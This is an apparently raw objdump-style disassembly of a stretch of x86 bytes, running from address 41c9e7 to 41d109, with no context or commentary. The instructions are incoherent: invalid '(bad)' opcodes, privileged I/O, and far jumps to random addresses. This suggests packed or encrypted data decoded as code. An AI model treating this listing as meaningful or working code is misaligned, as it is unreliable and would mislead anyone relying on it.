  41c9e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9e8:	nop
  41c9e9:	int3   
  41c9ea:	mov    ecx,0xfb83f4e1
  41c9ef:	pop    edx
  41c9f0:	das    
  41c9f1:	retf   0xb517
  41c9f4:	jmp    0xdeba7614
  41c9f9:	mov    es,WORD PTR [edx-0x22004303]
  41c9ff:	aaa    
  41ca00:	push   eax
  41ca01:	pusha  
  41ca02:	test   BYTE PTR [eax+0x53],ah
  41ca05:	inc    DWORD PTR [ebx+ebp*4+0x17]
  41ca09:	cs jmp 0x2c79f6ca
  41ca0f:	xchg   edx,eax
  41ca10:	jnp    0x41ca42
  41ca12:	pushf  
  41ca13:	retf   0x80f3
  41ca16:	dec    edi
  41ca17:	and    DWORD PTR [edx-0xa37347e],esp
  41ca1d:	(bad)  [eax]
  41ca1f:	retf   
  41ca20:	inc    edi
  41ca21:	int    0x88
  41ca23:	xor    esi,DWORD PTR [eax-0x60]
  41ca26:	mov    edx,DWORD PTR [edx+0x3f77542d]
  41ca2c:	aad    0x52
  41ca2e:	arpl   WORD PTR [esi],cx
  41ca30:	dec    edx
  41ca31:	dec    ebx
  41ca32:	mov    DWORD PTR [esi-0x4b3445ab],ecx
  41ca38:	add    ecx,DWORD PTR [eax]
  41ca3a:	pop    ecx
  41ca3b:	cwde   
  41ca3c:	das    
  41ca3d:	jmp    0xc855:0xdd4dff13
  41ca44:	xchg   edi,eax
  41ca45:	int    0x7c
  41ca47:	test   BYTE PTR [edx+0x55],dl
  41ca4a:	jns    0x41ca8c
  41ca4c:	dec    ebx
  41ca4d:	cmp    al,BYTE PTR [ebp+ebp*1+0x53d4dda0]
  41ca54:	push   es
  41ca55:	popf   
  41ca56:	fnstcw WORD PTR [eax]
  41ca58:	aad    0xb7
  41ca5a:	mov    cl,0x50
  41ca5c:	hlt    
  41ca5d:	push   ebp
  41ca5e:	fs pop ebp
  41ca60:	mov    ebx,0x32d325de
  41ca65:	cmp    dh,BYTE PTR ds:0x51974a42
  41ca6b:	stc    
  41ca6c:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41ca6e:	cmp    BYTE PTR [ebp-0x3dfa7cd7],bh
  41ca74:	in     al,0x26
  41ca76:	hlt    
  41ca77:	pop    ds
  41ca78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca79:	es popa 
  41ca7b:	sahf   
  41ca7c:	popf   
  41ca7d:	fcmovu st,st(5)
  41ca7f:	xlat   BYTE PTR ds:[ebx]
  41ca80:	and    BYTE PTR [edi-0x6ab0d9d],dl
  41ca86:	xor    dh,dh
  41ca88:	cld    
  41ca89:	sti    
  41ca8a:	(bad)  
  41ca8b:	out    0x4a,al
  41ca8d:	cdq    
  41ca8e:	out    0xfd,al
  41ca90:	stos   DWORD PTR es:[edi],eax
  41ca91:	or     al,0x3d
  41ca93:	mov    ch,0xe8
  41ca95:	xchg   edx,eax
  41ca96:	jbe    0x41ca65
  41ca98:	add    eax,0xf2814cac
  41ca9d:	sub    edi,DWORD PTR [edx+0xce1d3af]
  41caa3:	aad    0x89
  41caa5:	stos   DWORD PTR es:[edi],eax
  41caa6:	inc    edi
  41caa7:	into   
  41caa8:	std    
  41caa9:	jg     0x41ca2f
  41caab:	aam    0xe5
  41caad:	pop    ecx
  41caae:	xor    ecx,DWORD PTR [edi+edx*1+0x4b]
  41cab2:	adc    BYTE PTR [esi],0x9f
  41cab5:	aad    0xb5
  41cab7:	xchg   ecx,eax
  41cab8:	dec    ebp
  41cab9:	mov    ebp,0x9226ac6c
  41cabe:	push   edi
  41cabf:	stos   DWORD PTR es:[edi],eax
  41cac0:	repz xlat BYTE PTR ds:[ebx]
  41cac2:	mov    ch,0xfc
  41cac4:	cmp    al,bl
  41cac6:	and    DWORD PTR [ebp-0xcea2df1],0x788501ec
  41cad0:	jg     0x41caca
  41cad2:	pop    ecx
  41cad3:	rcr    BYTE PTR [ebp+eiz*8+0xe],1
  41cad7:	fwait
  41cad8:	pop    ds
  41cad9:	xor    al,0xe8
  41cadb:	sahf   
  41cadc:	cmc    
  41cadd:	jmp    0x41ca93
  41cadf:	or     BYTE PTR cs:[edi],0x8b
  41cae3:	shl    DWORD PTR [ecx],cl
  41cae5:	push   cs
  41cae6:	xchg   edx,eax
  41cae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cae8:	mov    esp,0x8854552f
  41caed:	xor    ebp,0x39c84c1c
  41caf3:	in     al,dx
  41caf4:	sub    bh,ah
  41caf6:	cmp    ebp,DWORD PTR ds:0x4f5b1d6e
  41cafc:	vunpcklpd ymm7,ymm5,YMMWORD PTR [edx]
  41cb00:	mov    BYTE PTR [edi-0x2e],cl
  41cb03:	pop    edi
  41cb04:	adc    DWORD PTR [eax*2-0x17e6ec7],0x60be63d6
  41cb0f:	mov    BYTE PTR [edx-0x47440190],bl
  41cb15:	push   cs
  41cb16:	xchg   ecx,eax
  41cb17:	sub    ch,BYTE PTR [ebx-0x3]
  41cb1a:	cmp    bl,cl
  41cb1c:	jne    0x41cab8
  41cb1e:	push   ss
  41cb1f:	call   0x3bc5:0x43923414
  41cb26:	or     al,0xe2
  41cb28:	sbb    BYTE PTR [ecx],dl
  41cb2a:	cwde   
  41cb2b:	inc    ecx
  41cb2c:	mov    dh,0x31
  41cb2e:	mov    esp,0xda5f2a8a
  41cb33:	scas   eax,DWORD PTR es:[edi]
  41cb34:	inc    esi
  41cb35:	lahf   
  41cb36:	or     al,0xda
  41cb38:	adc    BYTE PTR [eax+0x8],bl
  41cb3b:	and    eax,0x94bd38cf
  41cb40:	pop    ss
  41cb41:	and    al,0x6b
  41cb43:	popf   
  41cb44:	lock add DWORD PTR [edx+0x4],eax
  41cb48:	jle    0x41cad5
  41cb4a:	adc    esp,ebx
  41cb4c:	lock jb 0x41cb38
  41cb4f:	xor    bh,BYTE PTR [edx+0x6f4f5276]
  41cb55:	loope  0x41cb60
  41cb57:	loop   0x41cb26
  41cb59:	cmp    eax,0x6109c1c7
  41cb5e:	xchg   edx,eax
  41cb5f:	adc    edi,DWORD PTR [esi-0x35]
  41cb62:	sbb    eax,0x3e0ca043
  41cb67:	or     bl,al
  41cb69:	push   cs
  41cb6a:	aam    0x4d
  41cb6c:	jmp    DWORD PTR [ebp-0x372644cd]
  41cb72:	xor    dh,cl
  41cb74:	je     0x41cbbe
  41cb76:	test   dl,ch
  41cb78:	dec    ebx
  41cb79:	inc    ebx
  41cb7a:	stos   BYTE PTR es:[edi],al
  41cb7b:	(bad)  
  41cb7d:	aam    0xec
  41cb7f:	push   ss
  41cb80:	int    0x55
  41cb82:	cmp    eax,0xc862881c
  41cb87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb88:	bswap  ebx
  41cb8a:	push   esp
  41cb8b:	xchg   BYTE PTR [edi+0x52],al
  41cb8e:	cmp    ebx,DWORD PTR [edx+0x7b3b22a5]
  41cb94:	inc    DWORD PTR [edx]
  41cb96:	cdq    
  41cb97:	outs   dx,DWORD PTR ds:[esi]
  41cb98:	aad    0xf5
  41cb9a:	xchg   ecx,eax
  41cb9b:	or     al,0x78
  41cb9d:	fistp  DWORD PTR [eax]
  41cb9f:	ins    DWORD PTR es:[edi],dx
  41cba0:	jae    0x41cbc6
  41cba2:	aad    0xd5
  41cba4:	lods   eax,DWORD PTR ds:[esi]
  41cba5:	ins    DWORD PTR es:[edi],dx
  41cba6:	pop    eax
  41cba7:	dec    eax
  41cba8:	pop    esp
  41cba9:	hlt    
  41cbaa:	imul   esp,DWORD PTR [ecx+eiz*4-0x22],0x6f
  41cbaf:	mov    WORD PTR [ebx-0x2fe01e04],es
  41cbb5:	jne    0x41cba4
  41cbb7:	je     0x41cb94
  41cbb9:	out    dx,eax
  41cbba:	lods   eax,DWORD PTR ds:[esi]
  41cbbb:	xor    al,0xd2
  41cbbd:	icebp  
  41cbbe:	or     BYTE PTR [eax-0x53],ah
  41cbc1:	xchg   edi,eax
  41cbc2:	out    dx,eax
  41cbc3:	popa   
  41cbc4:	sbb    esi,ebx
  41cbc6:	dec    esp
  41cbc7:	and    eax,0x7855db1c
  41cbcc:	sub    DWORD PTR ds:0x4bea00af,esi
  41cbd2:	mov    DWORD PTR [ecx+0x315f5691],ebp
  41cbd8:	loopne 0x41cbd0
  41cbda:	stos   BYTE PTR es:[edi],al
  41cbdb:	sub    esi,edi
  41cbdd:	gs add eax,0x4d78895d
  41cbe3:	dec    edx
  41cbe4:	lods   al,BYTE PTR ds:[esi]
  41cbe5:	pop    es
  41cbe6:	in     al,0x67
  41cbe8:	test   BYTE PTR [esi],cl
  41cbea:	sbb    esi,DWORD PTR [edx-0x35]
  41cbed:	or     BYTE PTR [ebx],dh
  41cbef:	or     BYTE PTR [edi*4-0x4d667169],dh
  41cbf6:	in     eax,0xea
  41cbf8:	(bad)  
  41cbf9:	or     ch,BYTE PTR [ebx]
  41cbfb:	jb     0x41cbbd
  41cbfd:	es rol esi,0x8c
  41cc01:	mov    esp,0xd7a31514
  41cc06:	cs jle 0x41cc5e
  41cc09:	ret    0xb1c2
  41cc0c:	sub    DWORD PTR ds:0xf7cfee7d,edx
  41cc12:	jns    0x41cbd8
  41cc14:	xor    esi,DWORD PTR [eax+0x71]
  41cc17:	rcr    DWORD PTR [ebp+ebp*8+0x39],cl
  41cc1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc1c:	or     ch,ah
  41cc1e:	inc    ecx
  41cc1f:	cmp    edi,DWORD PTR [edi]
  41cc21:	into   
  41cc22:	push   0xffffffba
  41cc24:	outs   dx,BYTE PTR ds:[esi]
  41cc25:	les    ebp,FWORD PTR [edx-0x76f9f1b0]
  41cc2b:	add    al,0x9d
  41cc2d:	fstp   QWORD PTR [ebx+0x23]
  41cc30:	mov    fs,WORD PTR [ebx+0x14]
  41cc33:	sub    al,BYTE PTR [eax+esi*2]
  41cc36:	dec    ebx
  41cc37:	ficom  DWORD PTR [esi-0x28]
  41cc3a:	inc    edx
  41cc3b:	test   ch,bh
  41cc3d:	mov    esi,eax
  41cc3f:	stos   DWORD PTR es:[edi],eax
  41cc40:	add    dl,BYTE PTR [ecx]
  41cc42:	dec    eax
  41cc43:	or     BYTE PTR [ebx+edx*4],dh
  41cc46:	mov    ebp,0x2e9ded83
  41cc4b:	ror    ch,cl
  41cc4d:	sub    DWORD PTR [ebx-0x38],ebx
  41cc50:	dec    edi
  41cc51:	imul   ebx,DWORD PTR [ecx+edi*2-0x6d3d2f7a],0x1aef7bc3
  41cc5c:	stos   BYTE PTR es:[edi],al
  41cc5d:	sub    DWORD PTR [bx+si+0x7],eax
  41cc61:	es mov ebp,0x53f80ce9
  41cc67:	add    DWORD PTR [ecx],eax
  41cc69:	rcl    DWORD PTR [ebx+0x72],0x9a
  41cc6d:	xchg   edi,eax
  41cc6e:	dec    eax
  41cc6f:	fcmovnbe st,st(1)
  41cc71:	lahf   
  41cc72:	and    BYTE PTR [ebx-0x4b288360],cl
  41cc78:	jp     0x41cc87
  41cc7a:	mov    eax,0xd7853d95
  41cc7f:	int    0x14
  41cc81:	inc    edi
  41cc82:	jmp    0x41cc4a
  41cc84:	sub    al,0x1e
  41cc86:	iret   
  41cc87:	sub    DWORD PTR [ebx+0x7a],esp
  41cc8a:	scas   al,BYTE PTR es:[edi]
  41cc8b:	imul   ebp,edi,0xffffffe5
  41cc8e:	icebp  
  41cc8f:	cdq    
  41cc90:	pop    ss
  41cc91:	or     bh,dh
  41cc93:	cli    
  41cc94:	dec    esi
  41cc95:	(bad)  
  41cc96:	frstor [ebp+0x780a4da]
  41cc9c:	mov    al,0x3b
  41cc9e:	test   DWORD PTR [eax],esp
  41cca0:	jae    0x41cc93
  41cca2:	lods   al,BYTE PTR ds:[esi]
  41cca3:	sub    esp,DWORD PTR [eax+0x11ea2a30]
  41cca9:	xor    eax,0x62cd41a3
  41ccae:	lea    eax,[ebp-0x28f639f4]
  41ccb4:	xlat   BYTE PTR ds:[ebx]
  41ccb5:	popa   
  41ccb6:	lods   al,BYTE PTR ds:[esi]
  41ccb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccb8:	push   ebx
  41ccb9:	sar    esp,cl
  41ccbb:	mov    ah,0xcb
  41ccbd:	inc    ecx
  41ccbe:	push   DWORD PTR [ecx]
  41ccc0:	mov    bl,0xcd
  41ccc2:	out    dx,eax
  41ccc3:	and    BYTE PTR [esi+0x36f26e9a],cl
  41ccc9:	mov    DWORD PTR [ecx],eax
  41cccb:	lods   al,BYTE PTR ds:[esi]
  41cccc:	mov    ecx,0x4a9bcd83
  41ccd1:	mov    esp,?
  41ccd3:	in     eax,dx
  41ccd4:	daa    
  41ccd5:	iret   
  41ccd6:	rep lods eax,DWORD PTR ds:[esi]
  41ccd8:	cs hlt 
  41ccda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccdc:	xlat   BYTE PTR ds:[ebx]
  41ccdd:	das    
  41ccde:	cmp    eax,0x974afc95
  41cce3:	mov    dl,0xc1
  41cce5:	pop    ebp
  41cce6:	test   eax,0xd0528ef0
  41cceb:	push   ebp
  41ccec:	inc    edx
  41cced:	or     edi,DWORD PTR [esi]
  41ccef:	add    DWORD PTR [ebx+0x60],ecx
  41ccf2:	pop    esp
  41ccf3:	push   edi
  41ccf4:	add    BYTE PTR [ebp-0x7a88b39a],dl
  41ccfa:	cmc    
  41ccfb:	cmp    al,0xbe
  41ccfd:	js     0x41cd55
  41ccff:	lock cmp al,0x2f
  41cd02:	mov    ah,0xa1
  41cd04:	jmp    0xfc7e:0x932cb5d3
  41cd0b:	mov    edi,0x8cb3ee06
  41cd10:	outs   dx,BYTE PTR ds:[esi]
  41cd11:	dec    ebx
  41cd12:	sbb    eax,0xf9bdc46a
  41cd17:	mov    ecx,0x67e7e695
  41cd1c:	loop   0x41ccc7
  41cd1e:	repz mov ah,0xb
  41cd21:	and    DWORD PTR [ecx+0x7c],0x7cf1ec26
  41cd28:	push   0x3b989a40
  41cd2d:	jecxz  0x41cd38
  41cd2f:	mov    dl,0x75
  41cd31:	mov    ah,0x28
  41cd33:	arpl   WORD PTR ds:[edi+0xee5488],si
  41cd3a:	mov    cl,0x4b
  41cd3c:	sub    DWORD PTR [eax+0x31794b17],0xb608ccd5
  41cd46:	push   edx
  41cd47:	push   ss
  41cd48:	jne    0x41cd2e
  41cd4a:	das    
  41cd4b:	dec    ebx
  41cd4c:	sub    eax,0x657d7e76
  41cd52:	adc    al,0xd2
  41cd54:	jne    0x41cd03
  41cd56:	jge    0x41ccf1
  41cd58:	dec    edi
  41cd59:	cs pop ecx
  41cd5b:	or     esp,DWORD PTR [ecx-0x6]
  41cd5e:	adc    DWORD PTR [edi-0x16297d7],esi
  41cd64:	xchg   cl,ch
  41cd66:	popf   
  41cd67:	loope  0x41cd0a
  41cd69:	gs (bad) 
  41cd6b:	js     0x41cd7b
  41cd6d:	xlat   BYTE PTR ds:[ebx]
  41cd6e:	sub    cl,BYTE PTR [edi+0x11]
  41cd71:	loop   0x41cda6
  41cd73:	pop    ebp
  41cd74:	pop    es
  41cd75:	int    0xe7
  41cd77:	fst    QWORD PTR [edi+0x60dd22c]
  41cd7d:	jne    0x41cddb
  41cd7f:	cmp    ah,BYTE PTR [ebp+ecx*1-0x42c8f5cc]
  41cd86:	add    ebp,DWORD PTR [esi-0x7d]
  41cd89:	sbb    eax,0x8d3a4df1
  41cd8e:	lods   eax,DWORD PTR ds:[esi]
  41cd8f:	imul   edi,ebx,0x5d5a50f2
  41cd95:	(bad)  
  41cd96:	fdivr  DWORD PTR [ecx]
  41cd98:	data16 sub ah,al
  41cd9b:	mov    BYTE PTR [edi+0x2fd1b1a6],bl
  41cda1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cda2:	hlt    
  41cda3:	and    eax,0xadf224fe
  41cda8:	sbb    ch,BYTE PTR ds:0x2fadd055
  41cdae:	jp     0x41cd84
  41cdb0:	out    0x7a,al
  41cdb2:	inc    esp
  41cdb3:	inc    ebp
  41cdb4:	ins    DWORD PTR es:[edi],dx
  41cdb5:	imul   ecx,DWORD PTR [eax+0x3c],0x36
  41cdb9:	bound  esi,QWORD PTR [edx+ebp*8-0x2701bafd]
  41cdc0:	mov    DWORD PTR [eax-0x6c0c79f6],edi
  41cdc6:	add    BYTE PTR [edx+0x1f537bd1],dh
  41cdcc:	dec    edx
  41cdcd:	jbe    0x41ce29
  41cdcf:	mov    ebp,0xdb60dd99
  41cdd4:	push   edx
  41cdd5:	js     0x41cdab
  41cdd7:	rcr    DWORD PTR [esi+eiz*1+0x63],cl
  41cddb:	loop   0x41cd7e
  41cddd:	mov    ebp,0x354799c
  41cde2:	mov    eax,?
  41cde4:	js     0x41cdc4
  41cde6:	icebp  
  41cde7:	inc    edi
  41cde8:	das    
  41cde9:	fisubr WORD PTR [edx-0x7513cd0d]
  41cdef:	pop    edx
  41cdf0:	dec    ebx
  41cdf1:	bound  edx,QWORD PTR [ecx+0x38]
  41cdf4:	ret    0xc897
  41cdf7:	dec    esi
  41cdf8:	or     al,0x4d
  41cdfa:	or     DWORD PTR ds:0xb409945c,ebp
  41ce00:	aas    
  41ce01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce02:	mov    bh,0x2a
  41ce04:	inc    ebp
  41ce05:	add    bh,BYTE PTR [ecx-0x2b01d658]
  41ce0b:	test   dl,bh
  41ce0d:	into   
  41ce0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce0f:	pop    esi
  41ce10:	mov    WORD PTR [edi+edx*2+0x59e3af5],ss
  41ce17:	mov    ss,WORD PTR [ebp-0x77]
  41ce1a:	repz cmc 
  41ce1c:	rep lods eax,DWORD PTR ds:[esi]
  41ce1e:	daa    
  41ce1f:	cmp    eax,0x2e1ff5e4
  41ce24:	clc    
  41ce25:	imul   edx,DWORD PTR [ecx+0x21],0x69
  41ce29:	xchg   ch,cl
  41ce2b:	sub    BYTE PTR [ebx+esi*8-0x2ae50997],bl
  41ce32:	enter  0xc1cf,0x24
  41ce36:	jle    0x41ce96
  41ce38:	xlat   BYTE PTR ds:[ebx]
  41ce39:	xor    ah,BYTE PTR [esi-0x2e343801]
  41ce3f:	cdq    
  41ce40:	scas   al,BYTE PTR es:[edi]
  41ce41:	call   0xe23a:0xb70c4e46
  41ce48:	repnz fistp WORD PTR [eax-0x76096570]
  41ce4f:	ds out 0x6a,al
  41ce52:	xlat   BYTE PTR ds:[ebx]
  41ce53:	jns    0x41cdee
  41ce55:	xchg   edx,eax
  41ce56:	mov    edi,0xefb61913
  41ce5b:	cmc    
  41ce5c:	rcl    esi,0x3
  41ce5f:	cli    
  41ce60:	and    eax,0x9741080c
  41ce65:	inc    esi
  41ce66:	ret    0xf442
  41ce69:	sbb    eax,0x17f3a85f
  41ce6e:	out    0x89,al
  41ce70:	xchg   edi,eax
  41ce71:	inc    esi
  41ce72:	push   es
  41ce73:	jmp    0x41cebc
  41ce75:	pop    ebx
  41ce76:	mov    ebx,0x8676cf85
  41ce7b:	mov    ch,0x71
  41ce7d:	ins    DWORD PTR es:[edi],dx
  41ce7e:	repnz sti 
  41ce80:	mov    ah,0x1f
  41ce82:	push   ss
  41ce83:	loopne 0x41ced4
  41ce85:	call   0x884c128a
  41ce8a:	outs   dx,BYTE PTR ds:[esi]
  41ce8b:	popf   
  41ce8c:	push   ebp
  41ce8d:	mov    ds:0xe748e03,al
  41ce92:	adc    al,0xff
  41ce94:	ficom  DWORD PTR [edi]
  41ce96:	fwait
  41ce97:	scas   al,BYTE PTR es:[edi]
  41ce98:	dec    ebx
  41ce99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce9a:	idiv   BYTE PTR [edx]
  41ce9c:	xor    eax,0x1a7efdfb
  41cea1:	(bad)  
  41cea3:	pop    esp
  41cea4:	push   ds
  41cea5:	sar    eax,cl
  41cea7:	xchg   esp,eax
  41cea8:	xchg   BYTE PTR ds:0x993d4a4a,ch
  41ceae:	xchg   BYTE PTR [edx+0x7793613a],bh
  41ceb4:	dec    ebx
  41ceb5:	mov    dh,ch
  41ceb7:	xor    bh,dl
  41ceb9:	pop    esp
  41ceba:	inc    ecx
  41cebb:	ja     0x41ce58
  41cebd:	mov    bl,0x6f
  41cebf:	cmp    esp,DWORD PTR [esi]
  41cec1:	push   edx
  41cec2:	jne    0x41ce82
  41cec4:	lock push esp
  41cec6:	ds ss add al,0xf0
  41ceca:	lea    esp,[edx+0x4]
  41cecd:	mov    esi,0xa9ab97ad
  41ced2:	and    cl,bh
  41ced4:	jns    0x41ce99
  41ced6:	pop    eax
  41ced7:	cmp    eax,0x724ec4d2
  41cedc:	push   ss
  41cedd:	(bad)  
  41cede:	jg     0x41ced6
  41cee0:	xlat   BYTE PTR ds:[ebx]
  41cee1:	and    dh,BYTE PTR [eax*1+0x1b7fcd9c]
  41cee8:	(bad)  
  41cee9:	loope  0x41ce9b
  41ceeb:	pop    es
  41ceec:	jmp    0x41cebd
  41ceee:	add    cl,al
  41cef0:	rol    BYTE PTR [edx-0x8],0x83
  41cef4:	(bad)  
  41cef6:	not    esp
  41cef8:	add    bl,al
  41cefa:	dec    ecx
  41cefb:	fsub   st,st(4)
  41cefd:	jmp    0x41cf53
  41ceff:	and    al,0x7a
  41cf01:	mov    eax,ds:0x626695b4
  41cf06:	push   0x140c8dc6
  41cf0b:	sbb    BYTE PTR [eax+0x73],0xe8
  41cf0f:	cmp    DWORD PTR [ebx],esp
  41cf11:	jb     0x41cf6d
  41cf13:	(bad)  
  41cf14:	hlt    
  41cf15:	pop    es
  41cf16:	aas    
  41cf17:	or     DWORD PTR [esi-0x19],ebx
  41cf1a:	lock clc 
  41cf1c:	out    dx,al
  41cf1d:	add    dh,ch
  41cf1f:	loopne 0x41cef0
  41cf21:	loope  0x41cf95
  41cf23:	cmp    esp,edi
  41cf25:	ss cmp edi,esp
  41cf28:	cmp    dh,dh
  41cf2a:	jl     0x41cf68
  41cf2c:	push   0xccd859bb
  41cf31:	mov    edi,0xc775e640
  41cf36:	or     esi,DWORD PTR [ecx-0x1d]
  41cf39:	push   edi
  41cf3a:	adc    al,BYTE PTR [edi+0x4d]
  41cf3d:	fmul   DWORD PTR ds:0xe82c5bd8
  41cf43:	jg     0x41cf80
  41cf45:	pushf  
  41cf46:	(bad)  
  41cf47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf48:	fsub   DWORD PTR [ecx-0x49f60d6b]
  41cf4e:	sahf   
  41cf4f:	cmp    edi,esp
  41cf51:	xchg   edx,eax
  41cf52:	rcr    BYTE PTR [ebp-0x20885412],cl
  41cf58:	jle    0x41cf35
  41cf5a:	xchg   BYTE PTR [edx+0xb0866a1],ch
  41cf60:	je     0x41cfc3
  41cf62:	push   ebx
  41cf63:	sbb    dh,BYTE PTR [ecx-0x33]
  41cf66:	or     BYTE PTR [esi+ebp*2],al
  41cf69:	and    DWORD PTR [esi],ebx
  41cf6b:	aas    
  41cf6c:	push   0xfffffffe
  41cf6e:	or     BYTE PTR es:[ebp-0x36],ch
  41cf72:	into   
  41cf73:	add    DWORD PTR [edx-0x36],ebp
  41cf76:	sbb    eax,0xfee74e09
  41cf7b:	outs   dx,BYTE PTR fs:[esi]
  41cf7d:	xor    DWORD PTR [edx+edi*2+0x2e],esi
  41cf81:	das    
  41cf82:	gs mov ebx,0xa85979d5
  41cf88:	imul   ebx,DWORD PTR [ebp+eiz*4-0x70fc048b],0xffffff98
  41cf90:	push   es
  41cf91:	dec    esi
  41cf92:	fwait
  41cf93:	mov    cl,0x9d
  41cf95:	mov    ecx,0x16ca01b8
  41cf9a:	mov    al,ds:0x4e17ac93
  41cf9f:	rcl    BYTE PTR [ecx],1
  41cfa1:	sub    BYTE PTR [edx],bl
  41cfa3:	pop    eax
  41cfa4:	jmp    0xa54a3ad4
  41cfa9:	push   edi
  41cfaa:	adc    esp,DWORD PTR [ebx]
  41cfac:	add    eax,0x5fc14f46
  41cfb1:	inc    esi
  41cfb2:	xchg   ecx,eax
  41cfb3:	inc    eax
  41cfb4:	fs aam 0xd5
  41cfb7:	dec    edi
  41cfb8:	(bad)  
  41cfb9:	mov    esi,0xc8c91a9e
  41cfbe:	test   DWORD PTR [esi],0x5d57a3d
  41cfc4:	mov    ebp,DWORD PTR [ecx+0x69]
  41cfc7:	add    ah,BYTE PTR [ebp+0x21]
  41cfca:	aam    0x5e
  41cfcc:	mov    bl,0xa
  41cfce:	and    ebp,ebx
  41cfd0:	dec    esi
  41cfd1:	and    al,ch
  41cfd3:	inc    ebp
  41cfd4:	out    dx,al
  41cfd5:	not    BYTE PTR ds:[esi-0x3320ed65]
  41cfdc:	mov    al,ds:0xa9b1ad62
  41cfe1:	sahf   
  41cfe2:	stc    
  41cfe3:	mov    esp,0x568b0b92
  41cfe8:	push   cs
  41cfe9:	test   BYTE PTR [ecx+ebx*4+0x77ff529c],0x5a
  41cff1:	pop    eax
  41cff2:	leave  
  41cff3:	xchg   ebx,eax
  41cff4:	jae    0x41cf96
  41cff6:	int    0xb6
  41cff8:	call   DWORD PTR [ecx-0x1f]
  41cffb:	ret    
  41cffc:	popf   
  41cffd:	inc    edx
  41cffe:	pop    edi
  41cfff:	pause  
  41d001:	out    dx,al
  41d002:	cld    
  41d003:	retf   0xd787
  41d006:	adc    dh,BYTE PTR [ebp+0x5b6af25c]
  41d00c:	jl     0x41d042
  41d00e:	nop
  41d00f:	call   0x67d8:0x5034706
  41d016:	xchg   esi,eax
  41d017:	adc    dl,BYTE PTR [ebx+0x42d1f719]
  41d01d:	jmp    0x41d024
  41d01f:	gs call 0xa0596309
  41d025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d026:	jmp    0x41d033
  41d028:	daa    
  41d029:	push   0x3caf071b
  41d02e:	inc    ecx
  41d02f:	sete   BYTE PTR [edi-0x44f997b2]
  41d036:	pusha  
  41d037:	push   es
  41d038:	(bad)  
  41d039:	jae    0x41cfc6
  41d03b:	cmp    edx,0x1
  41d03e:	iret   
  41d03f:	in     eax,0x54
  41d041:	mov    edx,0x2734c938
  41d046:	imul   edx,DWORD PTR [edx],0xa358bc00
  41d04c:	mov    fs,WORD PTR [ecx]
  41d04e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d04f:	in     eax,dx
  41d050:	repz sub ch,ch
  41d053:	push   ds
  41d054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d055:	xchg   BYTE PTR [ecx-0xa8aa404],bl
  41d05b:	sub    esi,0x1b4fcbf2
  41d061:	fwait
  41d062:	and    bh,BYTE PTR [ebp+eax*1+0x48]
  41d066:	(bad)  
  41d067:	out    0x34,eax
  41d069:	mov    dh,0xc1
  41d06b:	adc    eax,0x5f8a109c
  41d070:	pop    ecx
  41d071:	sbb    bh,BYTE PTR [esi]
  41d073:	push   cs
  41d074:	jmp    0x41d01a
  41d076:	push   ss
  41d077:	leave  
  41d078:	(bad)  
  41d079:	and    DWORD PTR [edi],ebx
  41d07b:	push   ss
  41d07c:	and    eax,0x3aa4884a
  41d081:	outs   dx,BYTE PTR ds:[esi]
  41d082:	and    eax,0x9a876ac3
  41d087:	pushf  
  41d088:	inc    esp
  41d089:	jg     0x41d031
  41d08b:	daa    
  41d08c:	mov    ds:0x3fd33952,al
  41d091:	int    0xad
  41d093:	aaa    
  41d094:	mov    BYTE PTR [esp+edx*8],bh
  41d097:	sub    ecx,DWORD PTR [edx]
  41d099:	(bad)  [ecx+0x32]
  41d09c:	fisttp WORD PTR [edx+edx*8+0x55f9cc72]
  41d0a3:	ins    BYTE PTR es:[edi],dx
  41d0a4:	dec    edi
  41d0a5:	fimul  WORD PTR [edx]
  41d0a7:	inc    ecx
  41d0a8:	push   0x5b89b214
  41d0ad:	retf   0x1b2e
  41d0b0:	mov    BYTE PTR [edi],dh
  41d0b2:	dec    edx
  41d0b3:	loop   0x41d0e1
  41d0b5:	adc    BYTE PTR [ecx-0x7f],0xba
  41d0b9:	sub    cl,al
  41d0bb:	inc    eax
  41d0bc:	sbb    ah,0xda
  41d0bf:	and    al,0xd
  41d0c1:	stc    
  41d0c2:	xchg   ebx,eax
  41d0c3:	push   eax
  41d0c4:	jbe    0x41d073
  41d0c6:	aas    
  41d0c7:	mov    WORD PTR [ecx],?
  41d0c9:	mov    ds:0x14afd94,al
  41d0ce:	adc    DWORD PTR [ebx+eax*1+0x40],0x2490d82a
  41d0d6:	std    
  41d0d7:	sbb    al,0xbb
  41d0d9:	jmp    0x41d10a
  41d0db:	leave  
  41d0dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0dd:	in     al,0xe3
  41d0df:	iret   
  41d0e0:	mov    al,0x89
  41d0e2:	lods   al,BYTE PTR ds:[esi]
  41d0e3:	or     al,0xa4
  41d0e5:	adc    al,BYTE PTR [edi+0x10]
  41d0e8:	xchg   esi,eax
  41d0e9:	xchg   edx,eax
  41d0ea:	sti    
  41d0eb:	dec    edx
  41d0ec:	(bad)  
  41d0ed:	and    bl,BYTE PTR [edi]
  41d0ef:	inc    ebp
  41d0f0:	mov    esp,0x11e9f35a
  41d0f5:	dec    ebx
  41d0f6:	and    BYTE PTR [ebx],al
  41d0f8:	or     bh,BYTE PTR [ebx+0x7ca9ac46]
  41d0fe:	lods   eax,DWORD PTR ds:[esi]
  41d0ff:	sar    DWORD PTR ds:0x4af87d11,cl
  41d105:	hlt    
  41d106:	clc    
  41d107:	(bad)  
  41d108:	push   ss
  41d109:	mov    ebx,0x258ca43b
